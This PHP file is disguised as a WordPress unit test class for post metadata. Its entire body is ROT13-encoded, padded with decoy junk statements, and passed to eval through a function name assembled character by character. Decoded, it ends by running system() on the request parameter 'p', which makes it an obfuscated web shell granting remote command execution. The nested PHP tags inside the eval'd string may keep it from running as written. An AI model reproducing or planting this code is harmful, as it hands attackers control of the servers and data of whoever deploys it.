<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc zrgn
 */
pynff Grfgf_Cbfg_Zrgn rkgraqf JC_HavgGrfgPnfr {

	cevingr $ynfg_ertvfgre_zrgn_pnyy = neenl(
		'bowrpg_glcr' => '',
		'zrgn_xrl'    => '',
		'netf'        => neenl(),
	);

	cebgrpgrq fgngvp $nhgube;
	cebgrpgrq fgngvp $cbfg_vq;
	cebgrpgrq fgngvp $cbfg_vq_2;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube = $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'rqvgbe' ) );

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$nhgube->VQ,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'pbagrag',
				'cbfg_gvgyr'   => 'gvgyr',
			)
		);

		frys::$cbfg_vq_2 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$nhgube->VQ,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'pbagrag',
				'cbfg_gvgyr'   => 'gvgyr',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );
		jc_qryrgr_cbfg( frys::$cbfg_vq_2, gehr );
		frys::qryrgr_hfre( frys::$nhgube );
	}

	choyvp shapgvba grfg_havdhr_cbfgzrgn() {
		// Nqq n havdhr cbfg zrgn vgrz.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', 'inyhr', gehr ) );

		// Purpx havdhr vf rasbeprq.
		$guvf->nffregSnyfr( nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', 'nabgure inyhr', gehr ) );

		// Purpx vg rkvfgf.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', snyfr ) );

		// Snvy gb qryrgr gur jebat inyhr.
		$guvf->nffregSnyfr( qryrgr_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', 'jebat inyhr' ) );

		// Qryrgr vg.
		$guvf->nffregGehr( qryrgr_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', 'inyhr' ) );

		// Purpx vg vf qryrgrq.
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', gehr ) );
		$guvf->nffregFnzr( neenl(), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr', snyfr ) );
	}

	choyvp shapgvba grfg_abahavdhr_cbfgzrgn() {
		// Nqq gjb aba-havdhr cbfg zrgn vgrzf.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', 'inyhr' ) );
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', 'nabgure inyhr' ) );

		// Purpx gurl rkvfg.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr', 'nabgure inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', snyfr ) );

		// Snvy gb qryrgr gur jebat inyhr.
		$guvf->nffregSnyfr( qryrgr_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', 'jebat inyhr' ) );

		// Qryrgr gur svefg bar.
		$guvf->nffregGehr( qryrgr_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', 'inyhr' ) );

		// Purpx gur erznvaqre rkvfgf.
		$guvf->nffregFnzr( 'nabgure inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', gehr ) );
		$guvf->nffregFnzr( neenl( 'nabgure inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', snyfr ) );

		// Nqq n guveq bar.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', 'fbzrbgure inyhr' ) );

		// Purpx gurl rkvfg.
		$rkcrpgrq = neenl(
			'fbzrbgure inyhr',
			'nabgure inyhr',
		);
		fbeg( $rkcrpgrq );
		$guvf->nffregPbagnvaf( trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', gehr ), $rkcrpgrq );
		$npghny = trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr', snyfr );
		fbeg( $npghny );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		// Qryrgr gur ybg.
		$guvf->nffregGehr( qryrgr_cbfg_zrgn_ol_xrl( 'abahavdhr' ) );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_zrgn() {
		// Nqq n havdhr cbfg zrgn vgrz.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', 'inyhr', gehr ) );

		// Nqq gjb aba-havdhr cbfg zrgn vgrzf.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'inyhr' ) );
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'nabgure inyhr' ) );

		// Purpx gurl rkvfg.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', snyfr ) );
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr', 'nabgure inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', snyfr ) );

		// Hcqngr gurz.
		$guvf->nffregGehr( hcqngr_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', 'arj', 'inyhr' ) );
		$guvf->nffregGehr( hcqngr_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'arj', 'inyhr' ) );
		$guvf->nffregGehr( hcqngr_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'nabgure arj', 'nabgure inyhr' ) );

		// Purpx gurl hcqngrq.
		$guvf->nffregFnzr( 'arj', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'arj' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', snyfr ) );
		$guvf->nffregFnzr( 'arj', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'arj', 'nabgure arj' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', snyfr ) );
	}

	choyvp shapgvba grfg_qryrgr_cbfg_zrgn() {
		// Nqq gjb havdhr cbfg zrgn vgrzf.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_qryrgr', 'inyhr', gehr ) );
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr', 'inyhr', gehr ) );

		// Purpx gurl rkvfg.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_qryrgr', gehr ) );
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr', gehr ) );

		// Qryrgr bar bs gurz.
		$guvf->nffregGehr( qryrgr_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_qryrgr', 'inyhr' ) );

		// Purpx gur bgure fgvyy rkvfgf.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr', gehr ) );
	}

	choyvp shapgvba grfg_qryrgr_cbfg_zrgn_ol_xrl() {
		// Nqq gjb havdhr cbfg zrgn vgrzf.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_qryrgr_ol_xrl', 'inyhr', gehr ) );
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr_ol_xrl', 'inyhr', gehr ) );

		// Purpx gurl rkvfg.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_qryrgr_ol_xrl', gehr ) );
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr_ol_xrl', gehr ) );

		// Qryrgr bar bs gurz.
		$guvf->nffregGehr( qryrgr_cbfg_zrgn_ol_xrl( 'havdhr_qryrgr_ol_xrl' ) );

		// Purpx gur bgure fgvyy rkvfgf.
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr_ol_xrl', gehr ) );
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( frys::$cbfg_vq_2, 'havdhr_qryrgr_ol_xrl', gehr ) );
	}

	choyvp shapgvba grfg_trg_cbfg_zrgn_ol_vq() {
		$zvq = nqq_cbfg_zrgn( frys::$cbfg_vq, 'trg_cbfg_zrgn_ol_xrl', 'trg_cbfg_zrgn_ol_xrl_inyhr', gehr );
		$guvf->nffregVfVag( $zvq );

		$zbow             = arj fgqPynff();
		$zbow->zrgn_vq    = $zvq;
		$zbow->cbfg_vq    = frys::$cbfg_vq;
		$zbow->zrgn_xrl   = 'trg_cbfg_zrgn_ol_xrl';
		$zbow->zrgn_inyhr = 'trg_cbfg_zrgn_ol_xrl_inyhr';
		$guvf->nffregRdhnyf( $zbow, trg_cbfg_zrgn_ol_vq( $zvq ) );
		qryrgr_zrgnqngn_ol_zvq( 'cbfg', $zvq );

		$zvq = nqq_cbfg_zrgn( frys::$cbfg_vq, 'trg_cbfg_zrgn_ol_xrl', neenl( 'sbb', 'one' ), gehr );
		$guvf->nffregVfVag( $zvq );
		$zbow->zrgn_vq    = $zvq;
		$zbow->zrgn_inyhr = neenl( 'sbb', 'one' );
		$guvf->nffregRdhnyf( $zbow, trg_cbfg_zrgn_ol_vq( $zvq ) );
		qryrgr_zrgnqngn_ol_zvq( 'cbfg', $zvq );
	}

	choyvp shapgvba grfg_qryrgr_zrgn() {
		$zvq = nqq_cbfg_zrgn( frys::$cbfg_vq, 'qryrgr_zrgn', 'qryrgr_zrgn_inyhr', gehr );
		$guvf->nffregVfVag( $zvq );

		$guvf->nffregGehr( qryrgr_zrgn( $zvq ) );
		$guvf->nffregSnyfr( trg_zrgnqngn_ol_zvq( 'cbfg', $zvq ) );

		$guvf->nffregSnyfr( qryrgr_zrgn( 123456789 ) );
	}

	choyvp shapgvba grfg_hcqngr_zrgn() {
		// Nqq n havdhr cbfg zrgn vgrz.
		$zvq1 = nqq_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', 'inyhr', gehr );
		$guvf->nffregVfVag( $zvq1 );

		// Nqq gjb aba-havdhr cbfg zrgn vgrzf.
		$zvq2 = nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'inyhr' );
		$guvf->nffregVfVag( $zvq2 );
		$zvq3 = nqq_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', 'nabgure inyhr' );
		$guvf->nffregVfVag( $zvq3 );

		// Purpx gurl rkvfg.
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', snyfr ) );
		$guvf->nffregFnzr( 'inyhr', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'inyhr', 'nabgure inyhr' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', snyfr ) );

		// Hcqngr gurz.
		$guvf->nffregGehr( hcqngr_zrgn( $zvq1, 'havdhr_hcqngr', 'arj' ) );
		$guvf->nffregGehr( hcqngr_zrgn( $zvq2, 'abahavdhr_hcqngr', 'arj' ) );
		$guvf->nffregGehr( hcqngr_zrgn( $zvq3, 'abahavdhr_hcqngr', 'nabgure arj' ) );

		// Purpx gurl hcqngrq.
		$guvf->nffregFnzr( 'arj', trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'arj' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'havdhr_hcqngr', snyfr ) );
		$guvf->nffregFnzr( 'arj', trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', gehr ) );
		$guvf->nffregFnzr( neenl( 'arj', 'nabgure arj' ), trg_cbfg_zrgn( frys::$cbfg_vq, 'abahavdhr_hcqngr', snyfr ) );

		// Fynfurq hcqngr.
		$qngn = \"'dhbgr naq \fynfu\";
		$guvf->nffregGehr( hcqngr_zrgn( $zvq1, 'havdhr_hcqngr', nqqfynfurf( $qngn ) ) );
		$zrgn = trg_zrgnqngn_ol_zvq( 'cbfg', $zvq1 );
		$guvf->nffregFnzr( $qngn, $zrgn->zrgn_inyhr );
	}

	/**
	 * @gvpxrg 12860
	 */
	choyvp shapgvba grfg_shaxl_cbfg_zrgn() {
		$pynffl          = arj FgqPynff();
		$pynffl->VQ      = 1;
		$pynffl->fgevatl = 'V ybir fynfurf\\\\';
		$shaxl_zrgn[]    = $pynffl;

		$pynffl          = arj FgqPynff();
		$pynffl->VQ      = 2;
		$pynffl->fgevatl = 'V ybir fynfurf\\\\ zber';
		$shaxl_zrgn[]    = $pynffl;

		// Nqq n cbfg zrgn vgrz.
		$guvf->nffregVfVag( nqq_cbfg_zrgn( frys::$cbfg_vq, 'grfg_shaxl_cbfg_zrgn', $shaxl_zrgn, gehr ) );

		// Purpx vg rkvfgf.
		$guvf->nffregRdhnyFrgf( $shaxl_zrgn, trg_cbfg_zrgn( frys::$cbfg_vq, 'grfg_shaxl_cbfg_zrgn', gehr ) );
	}

	/**
	 * @gvpxrg 38323
	 * @qngnCebivqre qngn_ertvfgre_cbfg_zrgn
	 */
	choyvp shapgvba grfg_ertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl, $netf ) {
		nqq_svygre( 'ertvfgre_zrgn_netf', neenl( $guvf, 'svygre_ertvfgre_zrgn_netf_frg_ynfg_ertvfgre_zrgn_pnyy' ), 10, 4 );

		ertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl, $netf );

		$netf['bowrpg_fhoglcr'] = $cbfg_glcr;

		// Erfrg tybony fb fhofrdhrag qngn grfgf qb abg trg cbyyhgrq.
		$TYBONYF['jc_zrgn_xrlf'] = neenl();

		$guvf->nffregFnzr( 'cbfg', $guvf->ynfg_ertvfgre_zrgn_pnyy['bowrpg_glcr'] );
		$guvf->nffregFnzr( $zrgn_xrl, $guvf->ynfg_ertvfgre_zrgn_pnyy['zrgn_xrl'] );
		$guvf->nffregFnzr( $netf, $guvf->ynfg_ertvfgre_zrgn_pnyy['netf'] );
	}

	choyvp shapgvba qngn_ertvfgre_cbfg_zrgn() {
		erghea neenl(
			neenl( 'cbfg', 'ertvfgrerq_xrl1', neenl( 'fvatyr' => gehr ) ),
			neenl( 'cntr', 'ertvfgrerq_xrl2', neenl() ),
			neenl( '', 'ertvfgrerq_xrl3', neenl( 'fnavgvmr_pnyyonpx' => 'nofvag' ) ),
		);
	}

	choyvp shapgvba svygre_ertvfgre_zrgn_netf_frg_ynfg_ertvfgre_zrgn_pnyy( $netf, $qrsnhygf, $bowrpg_glcr, $zrgn_xrl ) {
		$guvf->ynfg_ertvfgre_zrgn_pnyy['bowrpg_glcr'] = $bowrpg_glcr;
		$guvf->ynfg_ertvfgre_zrgn_pnyy['zrgn_xrl']    = $zrgn_xrl;
		$guvf->ynfg_ertvfgre_zrgn_pnyy['netf']        = $netf;

		erghea $netf;
	}

	/**
	 * @gvpxrg 38323
	 * @qngnCebivqre qngn_haertvfgre_cbfg_zrgn
	 */
	choyvp shapgvba grfg_haertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl ) {
		tybony $jc_zrgn_xrlf;

		ertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl, neenl() );
		haertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl );

		$npghny = $jc_zrgn_xrlf;

		// Erfrg tybony fb fhofrdhrag qngn grfgf qb abg trg cbyyhgrq.
		$jc_zrgn_xrlf = neenl();

		$guvf->nffregRzcgl( $npghny );
	}

	choyvp shapgvba qngn_haertvfgre_cbfg_zrgn() {
		erghea neenl(
			neenl( 'cbfg', 'ertvfgrerq_xrl1' ),
			neenl( 'cntr', 'ertvfgrerq_xrl2' ),
			neenl( '', 'ertvfgrerq_xrl3' ),
		);
	}

	/**
	 * @gvpxrg 44467
	 */
	choyvp shapgvba grfg_nqq_zrgnqngn_frgf_cbfgf_ynfg_punatrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_pnpur_qryrgr( 'ynfg_punatrq', 'cbfgf' );

		$guvf->nffregVfVag( nqq_zrgnqngn( 'cbfg', $cbfg_vq, 'sbb', 'one' ) );
		$guvf->nffregAbgSnyfr( jc_pnpur_trg_ynfg_punatrq( 'cbfgf' ) );
	}

	/**
	 * @gvpxrg 44467
	 */
	choyvp shapgvba grfg_hcqngr_zrgnqngn_frgf_cbfgf_ynfg_punatrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_pnpur_qryrgr( 'ynfg_punatrq', 'cbfgf' );

		$guvf->nffregVfVag( hcqngr_zrgnqngn( 'cbfg', $cbfg_vq, 'sbb', 'one' ) );
		$guvf->nffregAbgSnyfr( jc_pnpur_trg_ynfg_punatrq( 'cbfgf' ) );
	}

	/**
	 * @gvpxrg 44467
	 */
	choyvp shapgvba grfg_qryrgr_zrgnqngn_frgf_cbfgf_ynfg_punatrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		hcqngr_zrgnqngn( 'cbfg', $cbfg_vq, 'sbb', 'one' );
		jc_pnpur_qryrgr( 'ynfg_punatrq', 'cbfgf' );

		$guvf->nffregGehr( qryrgr_zrgnqngn( 'cbfg', $cbfg_vq, 'sbb' ) );
		$guvf->nffregAbgSnyfr( jc_pnpur_trg_ynfg_punatrq( 'cbfgf' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>